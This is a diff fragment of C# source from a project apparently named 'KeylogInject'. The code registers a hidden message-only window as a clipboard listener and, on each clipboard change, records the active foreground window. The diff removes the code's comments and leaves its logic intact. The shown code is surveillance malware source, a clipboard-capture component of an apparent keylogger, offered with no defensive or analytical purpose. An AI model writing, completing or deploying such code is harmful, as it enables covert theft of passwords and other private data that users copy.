@@ -14,9 +14,9 @@ namespace KeylogInject
         string lastClipboard = "";
         public ClipboardNotification()
         {
-            //Turn the child window into a message-only window (refer to Microsoft docs)
+            
             SetParent(Handle, HWND_MESSAGE);
-            //Place window in the system-maintained clipboard format listener list
+            
             AddClipboardFormatListener(Handle);
         }
 
@@ -24,11 +24,11 @@ namespace KeylogInject
         {
             try
             {
-                //Listen for operating system messages
+                
                 if (m.Msg == WM_CLIPBOARDUPDATE)
                 {
 
-                    //Write to stdout active window
+                    
                     IntPtr active_window = GetForegroundWindow();
                     if (active_window != IntPtr.Zero && active_window != null)
                     {
@@ -58,13 +58,13 @@ namespace KeylogInject
                         }
                     }
                 }
-                //Called for any unhandled messages
+                
                 base.WndProc(ref m);
             }
             catch (Exception ex)
             {
-                //Console.WriteLine("[X] Error in WndProc: {0}", ex.Message);
-                //Console.WriteLine("[X] StackTrace: {0}", ex.StackTrace);
+                
+                
             }
         }
 
